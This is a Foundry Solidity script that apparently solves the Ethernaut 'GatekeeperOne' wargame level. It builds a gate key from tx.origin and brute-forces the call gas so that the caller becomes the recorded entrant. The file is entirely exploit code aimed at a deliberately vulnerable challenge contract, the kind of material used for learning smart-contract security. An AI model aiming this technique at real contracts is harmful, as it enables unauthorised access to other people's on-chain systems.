// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneSolve is Script{
    GatekeeperOne public gateOne = GatekeeperOne(0x4742252E47788a20b2C78a1343DEE68EC8De3804);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Entrant : ", address(gateOne.entrant()));

        new Attack().exploit();

        console.log("Entrant : ", address(gateOne.entrant()));
        vm.stopBroadcast();
    }
}

contract Attack{
    GatekeeperOne public gateOne = GatekeeperOne(0x4742252E47788a20b2C78a1343DEE68EC8De3804);

    function exploit() public {

        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        // uint32(uint64(_gateKey)) != uint64(_gateKey)
        // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))

        uint16 third = uint16(uint160(tx.origin));
        uint32 two = uint32(third);
        bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));

        bytes8 _gateKey = one;
        for (uint i = 0; i<=500; i++){
            (bool success, ) = address(gateOne).call{gas : (8191 * 4)+i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        }
    }
}